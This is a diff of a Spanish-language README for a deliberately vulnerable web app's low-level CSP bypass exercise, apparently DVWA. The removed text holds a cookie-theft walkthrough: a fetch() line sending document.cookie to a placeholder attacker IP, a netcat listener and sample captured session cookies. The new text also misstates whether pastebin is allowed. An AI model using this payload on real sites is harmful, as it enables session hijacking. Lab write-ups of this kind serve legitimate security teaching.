@@ -1,65 +1,30 @@
-# Explotación de Content Security Policy (CSP) para Robo de Cookies (Nivel Bajo)
+# Explotación de la CSP - Nivel de Seguridad Bajo
 
-Este README describe una prueba de concepto para explotar una configuración de Content Security Policy (CSP) débil para robar cookies de sesión. **Esta técnica debe utilizarse únicamente en entornos de prueba autorizados.**
+Este README describe brevemente la explotación de la Content Security Policy (CSP) en el nivel de seguridad bajo de una aplicación web vulnerable.
 
-## Descripción
+## Nivel de Seguridad Bajo
 
-Este exploit de bajo nivel se aprovecha de una CSP que permite la inclusión de scripts desde el dominio `pastebin.com`. Al inyectar una URL a un payload malicioso alojado en Pastebin, es posible ejecutar código JavaScript arbitrario en el contexto de la página web vulnerable y robar las cookies del usuario.
+**Análisis de la CSP:**
 
-## Herramientas Necesarias
+Al inspeccionar las cabeceras de respuesta HTTP con Burp Suite o las herramientas de desarrollo del navegador, se observa que la CSP **no permite** la ejecución de scripts desde `https://pastebin.com`.
 
-* Navegador web (se recomienda Firefox)
-* Acceso a [Pastebin](https://pastebin.com/)
-* Un servidor web para recibir las cookies robadas (o `netcat` para pruebas)
+**Explotación:**
 
-## Pasos de la Explotación
+La vulnerabilidad se explota incluyendo un script desde un dominio permitido por la CSP. En este caso, se utiliza la URL `https://digi.ninja/dvwa/cookie.js`, que contiene un script que muestra la ID de la cookie a través de una alerta.
 
-1.  **Descubrir la CSP:** Analizar las cabeceras HTTP de la página web objetivo para identificar la directiva `Content-Security-Policy` y las fuentes permitidas en `script-src`. Se asume que `https://pastebin.com` está permitido.
+**Pasos para la Explotación:**
 
-2.  **Preparar el Payload de Robo de Cookies:** Crear un script JavaScript que acceda a `document.cookie` y lo envíe a un servidor controlado por el atacante. Ejemplo:
+1.  En el campo de entrada proporcionado en la página del desafío, introduce la siguiente URL:
 
-    ```javascript
-    fetch('http://TU_IP:9999/?cookies=' + document.cookie);
-    console.log('Cookies sent!');
     ```
+    [https://digi.ninja/dvwa/cookie.js](https://digi.ninja/dvwa/cookie.js)
+    ```
+![imagen csp 1](../../assets/CSPLow01.png)
 
-    Reemplazar `TU_IP` con la dirección IP del servidor receptor.
+2.  Haz clic en el botón "Include" o similar.
 
-3.  **Iniciar el Servidor de Recepción de Cookies:**
-    * **Usando `netcat`:** Abrir una terminal y ejecutar:
-        ```bash
-        nc -lvp 9999
-        ```
-    * **Usando un servidor web:** Asegurarse de que el servidor esté en funcionamiento y configurado para recibir peticiones GET con el parámetro `cookies`.
+**Resultado:**
 
-4.  **Subir el Payload a Pastebin:**
-    * Ir a [https://pastebin.com/](https://pastebin.com/).
-    * Pegar el código JavaScript en el campo "New Paste".
-    * Seleccionar "JavaScript" en "Syntax Highlighting".
-    * Elegir la visibilidad deseada (por ejemplo, "Unlisted").
-    * Hacer clic en "Create New Paste".
+El script se cargará y ejecutará desde `digi.ninja` (un sitio web permitido por la CSP), mostrando una alerta con la información de la cookie de sesión. Esto demuestra cómo se puede explotar una CSP débil al utilizar fuentes de script permitidas para inyectar código malicioso.
 
-5.  **Obtener la URL "Raw" de Pastebin:** Acceder a la página del paste creado y obtener la URL de la versión "Raw".
-
-6.  **Explotar la CSP e Inyectar el Payload:**
-    * Volver a la página web vulnerable.
-    * Abrir la consola de desarrollador del navegador (Ctrl+Shift+K en Firefox).
-    * Pegar la URL "Raw" de Pastebin en el campo o mecanismo que permita la inclusión de scripts externos (como un formulario de inclusión).
-    * Ejecutar la acción para incluir el script.
-
-7.  **Verificar la Ejecución y Recepción de Cookies:**
-    * **Consola del navegador:** Verificar si aparece el mensaje `Cookies sent!`.
-    * **Servidor de recepción:**
-        * **`netcat`:** Debería mostrar una conexión entrante con una línea similar a:
-            ```
-            GET /?cookies=PHPSESSID=valor_de_la_sesion; otra_cookie=otro_valor; ... HTTP/1.1
-            Host: TU_IP:9999
-            ...
-            ```
-        * **Servidor web:** Revisar los logs del servidor para la petición GET con el parámetro `cookies`.
-
-## Resultado
-
-La recepción exitosa de las cookies, incluyendo la `PHPSESSID`, demuestra la vulnerabilidad de la CSP y el potencial para el secuestro de sesión.
-
-**Advertencia:** El uso de estas técnicas sin autorización es ilegal y éticamente inaceptable. Este documento se proporciona únicamente con fines educativos y de prueba en entornos controlados.
+![imagen csp 2](../../assets/CSPLow02.png)
